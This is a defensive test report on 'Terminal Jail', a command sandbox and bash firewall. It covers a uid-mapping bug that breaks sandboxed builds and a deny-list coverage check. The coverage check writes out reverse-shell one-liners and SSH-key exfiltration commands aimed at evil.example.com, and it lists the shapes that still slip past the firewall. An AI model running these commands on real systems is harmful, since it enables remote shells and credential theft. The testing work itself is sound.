# Terminal Jail — Dogfood Integration Report (2026-09-18)

**Verdict: PROMISING-BUT-ROUGH** (unchanged from 09-01/15/16/17, now with a harder
finding: the auto-sandbox's *better-isolation* branch breaks real work on standard hosts)
**Time-to-first-success:** <5 s local (`./standalone/terminal-jail echo hi`), 211 s
fresh-machine install (clone 210 s + `./install.sh` <1 s)
**Friction count:** 6 (1 blocking-on-standard-hosts, 3 firewall coverage, 2 doc/UX)
**New findings filed:** DF-TERMINAL-JAIL-15 … DF-TERMINAL-JAIL-20

---

## 1. What this project promises (null hypothesis)

*"Terminal Jail contains terminal commands in layers: the standalone CLI wrapper
(`standalone/terminal-jail`) runs any command inside a PID namespace; the Interruptor bash
firewall evaluates every command through a JSON bridge (`plugin/terminal_jail/interruptor_bridge.py`)
and decides allow / block / **modify** (auto-sandbox); an optional bubblewrap backend adds a
private `/proc`. A fresh user can install it with `git clone … && ./install.sh`, classify their
host with the shipped probes, and then run real work under the jail — sandboxed test/build/script
commands included."*

Previous runs (09-01 … 09-17) already exercised the CLI wrapper, the degraded-host path, the
rule matcher and the install leg. This run therefore aimed at the **newest shipped surface**,
which no prior run had used for real:

1. the **network-egress rule class** (TJ-GAP-058, shipped 2026-09-18 03:52),
2. the **aggregate auto-sandbox MODIFY rewrite** (TJ-GAP-066 fix, commit `36f957f`),
3. a **fresh-machine install on a host that is NOT the dev host** — one where the uid mapping
   works — because the dev host is AppArmor-degraded and can only ever exercise the
   mapping-less branch.

## 2. The real-use run (what a user actually does)

### 2.1 Firewall in front of a real work session (40 commands)

Driven through the documented bridge exactly as README shows
(`echo '{"command": …}' | python3 plugin/terminal_jail/interruptor_bridge.py`), with a work
session's own commands: git/find/grep/journalctl/ssh/scp/rsync/curl/wget/nc/docker/psql/tar/
pytest/make/pip/go/cargo/gcc/gh.

**Result: zero false positives.** Every fleet-legit shape the TJ-GAP-058 commit pins as
"fleet-legit" really did stay `allow` (`ssh`, `scp`, `rsync`, `git push`, `curl` GET,
`wget`, `nc -z`, `openssl s_client` diagnostics, `socat - TCP:host:port`, `grep -rn '/dev/tcp' docs/`,
bare `mkfifo`). `curl -T file http://…` was the one legitimate command the engine rewrote
(`modify` / `builtin-net-curl-upload`) — a sandbox on an upload, which is defensible.

### 2.2 The operator rewrite is faithful (TJ-GAP-066 fix verified live)

18 real command shapes with every operator form (`|`, `|&`, `&&`, `;`, `||`, `&`, `>`,
`2>&1`, subshells, `timeout`/`nice` prefixes, multiple sandbox-eligible segments) — the
rewritten string **lost no operator** and, executed end-to-end through the CLI, produced the
expected files and exit codes:

```
pytest plugin -q | tee /tmp/a.log   →  unshare … bash -c 'pytest plugin -q' | tee /tmp/a.log
pip install -e . && pytest -q | tee b.log ; echo DONE
   →  unshare … bash -c 'pip install -e .' && unshare … bash -c 'pytest -q' | tee b.log ; echo DONE
```

Executed: pipelines preserved, `tee`/`tail`/`grep` consumers received the data, env vars
propagated into jailed segments, stdin crossed the boundary, relative writes landed.
Credit where due — this was DF-CRIO-style "the rewrite drops my pipe" territory and it is fixed.

### 2.3 The mapped auto-sandbox breaks real work on a standard host (the run's headline)

On the **fresh ephemeral host** (bunker-las-02, Debian 13, unprivileged uid mapping allowed),
the same auto-sandbox that works on the dev host produces a different launch — and that launch
cannot run the user's own command:

```
$ cd ~/terminal-jail && python3 scripts/pidns-capability-probe.py         # quickstart §3a Step 1
FULL                                                                      # rc=0

$ cd ~/terminal-jail && terminal-jail python3 scripts/pidns-capability-probe.py
[terminal-jail] Modified: 'python3' 'scripts/pidns-capability-prob... → sandboxed
python3: can't open file '/home/<agent>/terminal-jail/scripts/pidns-capability-probe.py':
         [Errno 13] Permission denied
rc=2
```

Cause, pinned by hand-running both forms on that host:

| launch form | payload identity | can read the user's own files? |
|---|---|---|
| `unshare --user --map-users=65534:<subuid>:1 --map-groups=65534:<subgid>:1 -S 65534 -G 65534 --pid --fork --kill-child=SIGKILL` (chosen when the host permits mapping) | mapped to the caller's **subuid** (e.g. 1803936), i.e. **not** the caller | **No** — `ls` on a caller-owned file → `Permission denied`; home is `drwx------` |
| `unshare --user --pid --fork --kill-child=SIGKILL` (legacy, chosen when mapping is denied) | displays 65534, keeps the caller's kuid for DAC | Yes — script runs, writes land as the caller |

`plugin/terminal_jail/interruptor/userns.py::unshare_prefix()` picks the mapped prefix whenever
`mapped_launch_ok()` returns True — and that preflight is `unshare <mapped flags> true`, which
only proves the **namespace can be created**, never that the payload can still reach the work it
was asked to do. So on any mapping-capable host the transparent `modify` verdict turns
`pytest` / `make` / `python3 script.py` into a command that cannot read the project it was
pointed at. Non-silent (rc=2), but it breaks the tool's flagship behaviour for the normal case.

Reproduced shapes on that host: `terminal-jail python3 ~/writer.py` → `Permission denied, rc=2`;
script copied to a world-readable `/tmp` → ran, then its `$HOME` and repo writes failed
(`PermissionError 13`) *with rc=0* — a partial silent failure.

Workaround, verified at the engine level (mapped branch forced available, then flag applied):

```
no flag      -> unshare --user --map-users=65534:<subuid>:1 … -S 65534 -G 65534 --pid --fork --kill-child=SIGKILL bash -c
UID_MAP=0    -> unshare --user --pid --fork --kill-child=SIGKILL bash -c
UID_MAP=off  -> unshare --user --pid --fork --kill-child=SIGKILL bash -c
```

i.e. `TERMINAL_JAIL_UID_MAP=0` routes both the wrapper and the engine to the legacy branch
(`userns.py::uid_map_disabled`), which is the branch the bunker host was observed to run
successfully.

**Why the suite never caught it:** the dev host has no `/etc/subuid` entry for the caller, so
every test and every prior dogfood run only ever exercised the legacy branch. The one test that
does notice the mapped branch (`test_user_modify_rule_wraps_in_unshare`) reports it as *test
brittleness* — QA-TERMINAL-JAIL-8 — not as a runtime defect. This run supplies the runtime
evidence that both rows are about the same defect.

### 2.4 Firewall coverage on real exfil shapes (deny-list reality check)

36 attack vectors (13 blocked, 15 allowed, 8 auto-sandboxed; reverse shells + secret exfiltration of a real private-key path, using
`https://evil.example.com` as the collector). **All 11 reverse-shell shapes the pack claims are
blocked really were blocked**, with the right rule id:

`bash -i >& /dev/tcp/h/p 0>&1`, `exec 3<>/dev/tcp/…`, `/dev/udp/…`, `nc -e`, `ncat --exec`,
`ncat -c sh`, `cat f | sh -i | nc h p`, the `mkfifo` loop, `socat … EXEC:`, `socat TCP-LISTEN…,fork EXEC:`,
`openssl s_client … | sh`, and an `eval`-wrapped `/dev/tcp` — all `block`, correct rule ids.

What still reaches the wire (the honest gap list, filed as DF-16/17):

```
cat ~/.ssh/id_rsa | nc 100.x.x.x 4444        → allow  rule_id=allow-cat-safe   ← APPROVED, not just default-allow
cat ~/.ssh/id_rsa | nc -u 100.x.x.x 53       → allow  rule_id=allow-cat-safe
nc 100.x.x.x 4444 < ~/.ssh/id_rsa            → allow  rule_id=null
dd if=~/.ssh/id_rsa | nc 100.x.x.x 4444      → allow  rule_id=null
curl -F 'file=@~/.ssh/id_rsa' https://evil.example.com/collect   → allow rule_id=null
tar czf - ~/.ssh | ssh <host> 'cat > /tmp/loot.tgz'              → allow rule_id=null
python3 -c "import socket,os,pty;…pty.spawn('/bin/sh')"          → allow rule_id=null
python3 -c "import urllib.request;urlopen('https://evil…'+open('~/.ssh/id_rsa').read())" → allow rule_id=null
```

> **Update 2026-09-19 — DF-TERMINAL-JAIL-16 fixed.** The first four rows now **BLOCK**:
> `cat … | nc h p` and `dd if=… | nc h p` with `builtin-net-file-exfil-pipe`, `nc h p < …` with
> `builtin-net-file-exfil-redirect` — including the two that used to return the *approved* allow
> `rule_id=allow-cat-safe`. Still open from this list: `curl -F` multipart, `tar … | ssh host` (a
> non-raw-socket sink, deliberately outside the exfil family) and the interpreter shapes (DF-17).
> The boundary these verdicts sit on is now stated in `README.md` → *Data-Out Boundary* and
> `specs/interruptor.md` §4.6.

The new pack covers `-T/--upload-file`, `-d/--data*` and `@-` stdin uploads. It does not cover
the **multipart `-F/--form` file upload** — the single most common curl file-upload shape — nor
any non-curl egress (netcat, ssh, dd, interpreter sockets). And note the first two rows: the
always-allow layer (`allow-cat-safe`, which the README documents as "cat on non-sensitive paths")
matches **before** the egress layer, so the firewall doesn't merely fail to block that exfil — it
returns an *approval* with a rule id for it. `python3 -c …`/`sh -c …` being outside the
auto-sandbox set (while `python3 file.py` is inside) compounds this.

**And the `modify` verdicts do not prevent the transfer at all — measured.** With a real local
collector listening, `curl -s -T <secret> http://127.0.0.1:18777/collect` returned
`modify` / `builtin-net-curl-upload`, the CLI exited 0, and **the collector received 132 bytes
containing the secret**. Auto-sandbox is process containment: it does not stop the data leaving,
and on the mapping-less (legacy) branch the sandboxed `curl` reads the caller's file without
difficulty. Only a `block` verdict prevents egress — so the pack's MODIFY group should not be
read as exfil protection (DF-TERMINAL-JAIL-20).

### 2.5 Fresh-machine install leg — proved on a spare bunker host

The standard leg (bunker-las-03) failed again: `bunker spawn` → `deadline_exceeded: context
deadline exceeded` — the **second consecutive dogfood run** with that exact failure (DF-14,
2026-09-17, was closed as complete). The host itself is healthy (bunkerd active, load 0.05,
`newuidmap` present, `/etc/subuid` ranges present) and 13 leaked `bunker-*` users (uids
1001–1015) remain on it. Filed as DF-TERMINAL-JAIL-19 / SKIPPED-install-bunker-on-las-03.

The leg was completed on **bunker-las-02** instead, exactly as the docs say (no repo
visibility/permission change was needed — the GitHub repo clones anonymously):

| step | command (documented) | result |
|---|---|---|
| clone | `git clone https://github.com/totalwindupflightsystems/terminal-jail.git` | ok, **210 s**, HEAD `5275a86` |
| install | `./install.sh` | **rc=0, <1 s** — wrapper → `~/.local/bin`, plugin bridge tree, seccomp loader, default rules → `~/.config/terminal-jail/rules.d/00-builtins.yaml`, PATH line appended |
| classify | `terminal-jail --version` / `pidns-capability-probe.py` / `fs-isolation-probe.py` | `1.1.0` / **FULL** / **FULL** |
| contain | `terminal-jail sh -c 'readlink /proc/self/ns/pid'` | different inode from host ✓ |
| block | `terminal-jail rm -rf /` | `COMMAND BLOCKED — builtin-rm-rf-root`, **rc=126** ✓ |
| bridge | README `echo hello` / `rm -rf /` examples | exact match with the documented output ✓ |
| bwrap backend | `TERMINAL_JAIL_JAIL_BACKEND=auto … ls /proc \| grep -c '^[0-9]'` | **4** PIDs (host: thousands) — private `/proc` real ✓ |

Agent destroyed after the run (`bunker destroy` → "Agent 06c4c905 destroyed"), verified gone.

## 3. What works, what a new user must know

**Works, verified this run.** Install on a clean Debian box (sub-second, non-root, rules + PATH
installed); the documented FULL-branch verify sequence including `rc=126` on a blocked command;
bubblewrap private `/proc`; the whole reverse-shell blocklist with correct rule ids; the operator-
preserving aggregate rewrite (18/18 shapes); zero false positives across a 40-command real work
session; and — importantly — **`modify` is visible to the user** (`[terminal-jail] Modified: … →
sandboxed`) and the jailed process is genuinely different (`PIDNS` inode changes, uid 65534,
writes land as the caller on the degraded branch).

**What a user must know (not in the docs).**
1. On a mapping-capable host (i.e. most real Linux boxes), every auto-sandboxed command that
   touches your own files fails with `Permission denied`. Until DF-15 is fixed, users there
   should run with `TERMINAL_JAIL_UID_MAP=0` (which forces the legacy branch in both the wrapper
   and the engine) or with `TERMINAL_JAIL_INTERRUPTOR_MODE=disabled`.
2. The security boundary of the firewall is the reverse-shell shapes it names. It is a
   deny-list: the shapes in §2.4 reach the network, and two of them are *approved* by the
   allowlist layer.
3. Rule ids are the useful debugging handle: an `allow` with `rule_id: null` is default-allow
   (no rule matched); an `allow` with a rule id is a decision, and when that id is `allow-cat-safe`
   it can outrank the egress rules.

## 4. Friction log (chronological, evidence-first)

1. `bunker spawn --server bunker-las-03` → `deadline_exceeded` (2nd run in a row) → install leg
   re-homed to las-02. (~12 min lost; DF-19)
2. Clone inside the ephemeral bunker took **210 s** for a small repo — no progress output, looks
   hung; the quickstart gives no expected-time hint. (friction, no row)
3. `terminal-jail python3 scripts/pidns-capability-probe.py` → `Permission denied`, rc=2 —
   the quickstart's own Step-1 command, through the tool, on a mapping-capable host. (DF-15)
4. Running the probes **through** the jail returns `UNKNOWN` instead of a classification
   (`pidns-capability-probe.py` → `UNKNOWN: probe timed out after 15s`;
   `fs-isolation-probe.py` → `UNKNOWN: probe error: [Errno 22] Invalid argument: '/tmp/tj-fsiso-…/secret600'`)
   while the same probes directly report `FULL` / `DEGRADED`. The probes are documented as
   "classify any host", so a user inside a jail-wrapped shell gets a misleading answer, not an
   error. (DF-18)
5. `cat ~/.ssh/id_rsa | nc host 4444` → `allow` with `rule_id=allow-cat-safe`. (DF-16) — **fixed 2026-09-19**: now `block` / `builtin-net-file-exfil-pipe`.
6. `curl -F 'file=@~/.ssh/id_rsa' https://evil.example.com/collect` → `allow`, `rule_id=null`. (DF-17)

## 5. Verdict rationale

The install story, the blocklist, the operator rewrite, and the degraded-branch behaviour are
all real and verified on a clean machine — this is not a toy. But the tool's headline feature
(*transparent* auto-sandboxing of build/test/script commands) is **broken on the branch that a
normal host takes**, and the firewall's new egress class leaves the ordinary exfil shapes open
(one of them approved). Both are fixable without redesign, and both are invisible from the dev
host — which is exactly why this run paid for itself. Verdict stays **PROMISING-BUT-ROUGH**:
real value, usability blockers, and a security boundary that must be stated more narrowly than
"blocks reverse shells and exfil".

## 6. Filed this run

| id | pri | finding |
|---|---|---|
| DF-TERMINAL-JAIL-15 | P1 | mapped auto-sandbox prefix cannot read the caller's own files (payload = caller's subuid) → every sandboxed build/test/script command in `$HOME` fails `Permission denied` on mapping-capable hosts; the preflight proves only namespace creation |
| DF-TERMINAL-JAIL-16 | P1 | `allow-cat-safe` (always-allow) short-circuits the network-egress layer → `cat <secret> \| nc host port` returns an *approved* verdict; `nc host < secret`, `dd if=secret \| nc`, `tar czf - ~/.ssh \| ssh host` also pass |
| DF-TERMINAL-JAIL-17 | P1 | egress pack misses `curl -F/--form` multipart uploads, interpreter sockets (`python3 -c` socket/pty, urllib/requests POST) and `python3 -c`/`sh -c` are outside the auto-sandbox set |
| DF-TERMINAL-JAIL-18 | P2 | shipped host-classification probes are not jail-aware: run under the jail they report `UNKNOWN` (timeout / errno 22) where direct runs report `FULL`/`DEGRADED` |
| DF-TERMINAL-JAIL-19 | P2 | bunker-las-03 spawn `deadline_exceeded` (2nd consecutive run; DF-14 closed without restoring the capability) + 13 leaked `bunker-*` users on the host; install leg moved to las-02 |
| DF-TERMINAL-JAIL-20 | P1 | egress `modify` verdicts do not prevent exfiltration — a real local collector received the uploaded secret (132 bytes) with the CLI exiting 0; only a `block` prevents egress |

## 7. How to reproduce everything here

```bash
# firewall coverage + false positives (no install needed, uses the documented bridge)
python3 - <<'EOF'
import json,subprocess,sys
for c in ["ls -la","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","cat ~/.ssh/id_rsa | nc 10.0.0.1 4444",
          "curl -F 'file=@~/.ssh/id_rsa' https://evil.example.com/collect"]:
    print(c, "->", subprocess.run([sys.executable,"plugin/terminal_jail/interruptor_bridge.py"],
          input=json.dumps({"command":c}),capture_output=True,text=True).stdout.strip())
EOF

# the mapped-launch defect, on any host where `unshare --user --map-users=65534:<subuid>:1 \
#   --map-groups=65534:<subgid>:1 -S 65534 -G 65534 --pid --fork --kill-child=SIGKILL true` succeeds
python3 scripts/fs-isolation-probe.py          # FULL here → you are on the affected branch
terminal-jail python3 scripts/pidns-capability-probe.py   # → Permission denied, rc=2
TERMINAL_JAIL_UID_MAP=0 terminal-jail python3 scripts/pidns-capability-probe.py   # → works (legacy)
```
